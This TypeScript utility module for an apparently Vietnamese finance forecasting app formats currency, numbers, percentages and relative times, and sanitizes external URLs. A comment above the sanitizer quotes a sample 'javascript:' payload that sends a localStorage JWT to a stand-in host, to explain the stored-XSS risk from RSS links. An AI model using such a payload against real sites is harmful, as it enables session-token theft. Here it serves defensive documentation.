import { useCurrencyStore } from "./store"

export function formatCurrency(value: number, opts?: { compact?: boolean; decimals?: number; currency?: string }): string {
  let v = Number(value) || 0
  
  const state = useCurrencyStore.getState()
  const globalCurrency = state.currency
  const exchangeRate = state.exchangeRate || 25400

  // Ticker base currency (VD: FPT.VN -> VND, BTC-USD -> USD)
  const isBaseVND = opts?.currency === "VND" || opts?.currency?.endsWith(".VN")

  // Logic chuyển đổi
  if (globalCurrency === "VND") {
    // Nếu hệ thống đang hiển thị VND, mà tài sản là USD -> nhân tỷ giá
    if (!isBaseVND) {
      v = v * exchangeRate
    }
  } else {
    // Nếu hệ thống đang hiển thị USD, mà tài sản là VND -> chia tỷ giá
    if (isBaseVND) {
      v = v / exchangeRate
    }
  }

  // Quyết định format đầu ra
  const isOutputVND = globalCurrency === "VND"
  const locale = isOutputVND ? "vi-VN" : "en-US"
  const currency = isOutputVND ? "VND" : "USD"

  if (opts?.compact) {
    return new Intl.NumberFormat(locale, {
      style: "currency",
      currency: currency,
      notation: "compact",
      maximumFractionDigits: 2,
    }).format(v)
  }
  return new Intl.NumberFormat(locale, {
    style: "currency",
    currency: currency,
    minimumFractionDigits: isOutputVND ? 0 : (opts?.decimals ?? 2),
    maximumFractionDigits: isOutputVND ? 0 : (opts?.decimals ?? 2),
  }).format(v)
}

export function formatNumber(value: number, opts?: { compact?: boolean; decimals?: number }): string {
  const v = Number(value) || 0
  return new Intl.NumberFormat("en-US", {
    notation: opts?.compact ? "compact" : "standard",
    minimumFractionDigits: 0,
    maximumFractionDigits: opts?.decimals ?? 2,
  }).format(v)
}

export function formatPercent(value: number): string {
  const v = Number(value) || 0
  const sign = v > 0 ? "+" : ""
  return `${sign}${v.toFixed(2)}%`
}

export function formatSigned(value: number): string {
  const v = Number(value) || 0
  const sign = v > 0 ? "+" : ""
  return `${sign}${formatCurrency(v)}`
}

/**
 * Khoảng thời gian đã trôi qua, theo ngôn ngữ đang chọn.
 *
 * LỖI ĐÃ SỬA: bản cũ luôn trả tiếng Anh, nên ở chế độ VI các trang Research,
 * Research Archive và bảng người dùng trong Admin hiện "5m ago", "2d ago" xen giữa
 * nội dung tiếng Việt.
 *
 * Đọc ngôn ngữ thẳng từ localStorage (khoá persist của useLangStore) thay vì import
 * store — `format.ts` là module thuần, không nên phụ thuộc vào React store.
 */
function currentLang(): "en" | "vi" {
  if (typeof window === "undefined") return "en"
  try {
    const raw = localStorage.getItem("forecastai-lang")
    if (!raw) return "en"
    const parsed = JSON.parse(raw)
    return parsed?.state?.lang === "vi" ? "vi" : "en"
  } catch {
    return "en"
  }
}

export function timeAgo(iso: string, lang?: "en" | "vi"): string {
  const l = lang ?? currentLang()
  const diff = Date.now() - new Date(iso).getTime()
  const mins = Math.floor(diff / 60000)
  if (l === "vi") {
    if (mins < 1) return "vừa xong"
    if (mins < 60) return `${mins} phút trước`
    const h = Math.floor(mins / 60)
    if (h < 24) return `${h} giờ trước`
    return `${Math.floor(h / 24)} ngày trước`
  }
  if (mins < 1) return "just now"
  if (mins < 60) return `${mins}m ago`
  const hours = Math.floor(mins / 60)
  if (hours < 24) return `${hours}h ago`
  const days = Math.floor(hours / 24)
  return `${days}d ago`
}

/**
 * Lọc URL đến từ nguồn không tin cậy trước khi đưa vào thuộc tính href.
 *
 * VÌ SAO CẦN: `research_agent.py` lưu `entry.get("link", "")[:500]` nguyên xi từ
 * feed RSS. React KHÔNG chặn `javascript:` trong href, nên một mục RSS có
 * `link = "javascript:fetch('https://evil/?t='+localStorage.forecast_ai_token)"`
 * sẽ hiển thị như một "Nguồn tham khảo" bình thường, và người dùng bấm vào là
 * script chạy trong origin của ứng dụng — lấy được JWT đang nằm trong localStorage.
 *
 * Trả về "#" cho mọi thứ không phải http/https.
 */
export function safeExternalHref(raw: unknown): string {
  if (typeof raw !== "string" || !raw) return "#"
  try {
    const url = new URL(raw, typeof window !== "undefined" ? window.location.origin : "https://localhost")
    return url.protocol === "http:" || url.protocol === "https:" ? url.href : "#"
  } catch {
    return "#"
  }
}
